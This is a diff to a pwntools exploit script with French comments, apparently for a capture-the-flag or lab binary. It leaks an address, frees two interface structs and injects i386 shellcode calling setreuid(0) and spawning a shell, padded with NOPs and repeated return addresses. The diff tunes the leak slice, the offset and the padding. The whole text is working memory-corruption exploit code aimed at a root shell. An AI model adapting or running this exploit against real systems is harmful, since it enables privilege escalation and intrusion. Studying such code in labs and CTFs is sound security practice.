@@ -52,11 +52,11 @@ print("Seeking leaked @ now ! ")
 p.sendline("4")
 text = p.recv()
 
-addr = text[26:33]
+addr = text[26:34]
 import binascii
 addr_hex=binascii.unhexlify(addr.hex()).decode('utf8')
 print("Adresse turnOn de la struct: %s" % addr_hex) 
-addr_buf = int(addr_hex,16)- 62
+addr_buf = int(addr_hex,16)- 92
 print("buffer @ = 0x%x" % addr_buf)
 
 print("Destruction des 2 interfaces crees !") 
@@ -84,12 +84,12 @@ p.recv()
 
 print("Insertion du shellcode dans le champs ip pour copie dans inter 2 via strndup")
 context.update(arch='i386', os='linux')
-#51 shell + 9 nop+ 4@
+#shell + 3 nop+ 10*4@
 #rq: shellcode variant => use nop to align/ verfi size ecrasement
-shellcode = shellcraft.setreuid(0)+shellcraft.sh() + (shellcraft.nop()*9)
+shellcode = shellcraft.setreuid(0)+shellcraft.sh() + (shellcraft.nop()*3)
 print(shellcode)
 shellcode = asm(shellcode) 
-shellcode +=pwnlib.util.packing.p32(addr_buf, endian='little')
+shellcode +=(pwnlib.util.packing.p32(addr_buf, endian='little')*10)
 print(hexdump(shellcode))
 #p.send(shellcode)
 p.sendline(shellcode)
